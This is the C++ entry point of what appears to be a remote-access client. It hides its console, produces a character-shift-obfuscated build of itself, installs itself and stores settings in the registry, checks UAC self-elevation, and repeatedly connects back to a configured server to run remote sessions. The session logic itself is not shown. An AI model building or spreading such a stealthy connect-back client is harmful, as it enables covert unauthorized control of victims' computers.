#include <iostream>
#include <obfuscate.h>
#include <EssNet.h>
#include <Essentials.h>
#include <json.hpp>
#include <opencv2/opencv.hpp>
#include <zlib.h>

using Json = nlohmann::json;
using namespace cv;

string Version = "2.0.0-b.6";
int VersioneCompatibile = 4;

using namespace std;

#include "Debugger.hpp"

Debugger debug;

#include "Comunicazioni.hpp"
#include "Settaggi.hpp"
#include "Installer.hpp"
#include "Monitor.hpp"
#include "Services.hpp"
#include "Sessione.hpp"

int main()
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    TcpIP Client;
    SystemUtils su;
    DirUtils du;
    Encode en;
    ConsoleUtils cu;
    Settaggi sett;
    EasyMSGB msgb;
    Installer installer;

    AllocConsole();
    if (!debug.Active)
        cu.HideConsole();
    else
    {
        freopen_s((FILE**)stdout, "CONOUT$", "w", stdout);
    }

    // Per generare la build del Client da distribuire
    if (debug.MakeBuild)
    {
        en.CharShift(69, du.GetFullModuleFilePath(), du.GetModuleFilePath() + "ClientBuild.exe");
        return 0;
    }

    // Per test locali senza installazione
    if (debug.SkipInstall)
    {
        sett.Host = "127.0.0.1";
        sett.Porta = 6969;
    }
    else
    {
        if (!installer.IsInstalled())
        {
            short rtn = installer.InstallClient();

            debug.log.Info("Codice installazione: " + to_string(rtn));

            return 0;
        }

        sett.GetSettingsFromReg();
    }
	
    // Verifica che l'auto elevazione sia andata a buon fine
    if (du.CheckFile(du.GetModuleFilePath() + "Aele"))
    {
        if (su.CheckUAC())
        {
            du.WriteFile(du.GetModuleFilePath() + "AeleOK");
        }
        else
        {
            if (du.CheckFile(du.GetModuleFilePath() + "AeleOK"))
            {
                du.DelFile(du.GetModuleFilePath() + "Aele");
                du.DelFile(du.GetModuleFilePath() + "AeleOK");
                du.DelFile(du.GetModuleFilePath() + "AeleSA");
                return 0;
            }
            
            du.DelFile(du.GetModuleFilePath() + "Aele");

            if (du.CheckFile(du.GetModuleFilePath() + "AeleSA"))
            {
                du.DelFile(du.GetModuleFilePath() + "AeleSA");
                return 0;
            }
        }
    }

    su.GetCPUload(); // Altrimenti con il GetInfo la prima volta da sempre il 6%

    Client.Host = sett.Host;
    Client.Port = sett.Porta;

    if (Client.StartClient() != 0)
    {
        Client.Stop();
        _getch();
        return 0;
    }

    for (bool i = true; i;)
    {
        while (!Client.Connect()) { Sleep(100); }
        
        debug.log.Info("Ricevuta connessione");

        if (COMUNICAZIONI::Inizializzazione(Client.Sock))
        {
            debug.log.Info("Connessione accettata");

            Sessione s(Client.Sock);

            switch (s.Start())
            {
                case 0:
                    closesocket(Client.Sock);
                    break;

                case 1:
                    closesocket(Client.Sock);
                    Client.Stop();
                    return 0;
                    break;
            }

            debug.log.Info("Disconnesso");
        }
        Client.Stop();
        Client.StartClient();
    }

    return 0;
}